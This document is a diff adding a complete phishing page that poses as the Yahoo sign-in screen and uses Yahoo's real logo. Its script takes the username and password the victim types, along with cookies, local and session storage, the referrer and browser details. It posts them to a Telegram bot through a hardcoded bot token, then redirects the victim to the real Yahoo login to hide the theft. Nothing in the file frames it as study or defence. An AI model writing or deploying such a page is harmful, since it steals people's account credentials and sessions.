@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Yahoo - Sign In</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f8fa;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      height: 100vh;
+      align-items: center;
+      justify-content: center;
+    }
+    .login-container {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+    .yahoo-logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 120px;
+    }
+    h1 {
+      font-size: 22px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #6001d2;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #4a00aa;
+    }
+    .note {
+      font-size: 12px;
+      color: #555;
+      text-align: center;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-container">
+  <img src="https://s.yimg.com/rz/l/yahoo_en-US_f_p_bestfit_2x.png" class="yahoo-logo" alt="Yahoo Logo" />
+  <h1>Sign in to Yahoo</h1>
+  <input type="text" id="username" placeholder="Email or mobile" required />
+  <input type="password" id="password" placeholder="Password" required />
+  <button onclick="exfiltrate()">Next</button>
+  <p class="note">Not your computer? Use Guest mode to sign in privately.</p>
+</div>
+
+<script>
+function getStorageDump(storage) {
+  let out = "";
+  for (let i = 0; i < storage.length; i++) {
+    const key = storage.key(i);
+    const value = storage.getItem(key);
+    out += key + "=" + value + "; ";
+  }
+  return out || "None";
+}
+
+async function exfiltrate() {
+  const username = document.getElementById("username").value.trim();
+  const password = document.getElementById("password").value.trim();
+
+  const payload = {
+    chat_id: "7154713742",
+    text: [
+      "🎣 *Yahoo Phishing Capture*",
+      "",
+      "*URL:* " + location.href,
+      "*Referrer:* " + (document.referrer || "N/A"),
+      "*Username:* " + username,
+      "*Password:* " + password,
+      "*Cookies:* " + (document.cookie || "None"),
+      "*LocalStorage:* " + getStorageDump(localStorage),
+      "*SessionStorage:* " + getStorageDump(sessionStorage),
+      "*User Agent:* " + navigator.userAgent,
+      "*Language:* " + navigator.language,
+      "*Platform:* " + navigator.platform,
+      "*Timezone:* " + Intl.DateTimeFormat().resolvedOptions().timeZone
+    ].join("\n")
+  };
+
+  await fetch("https://api.telegram.org/bot8124847122:AAFhV7O1JtqexwKdV-EmQfq27uaeW_SNBFE/sendMessage", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+
+  // Optional: delay before redirect
+  setTimeout(() => {
+    window.location.href = "https://login.yahoo.com";
+  }, 1500); // Delay to simulate form processing
+}
+</script>
+
+</body>
+</html>
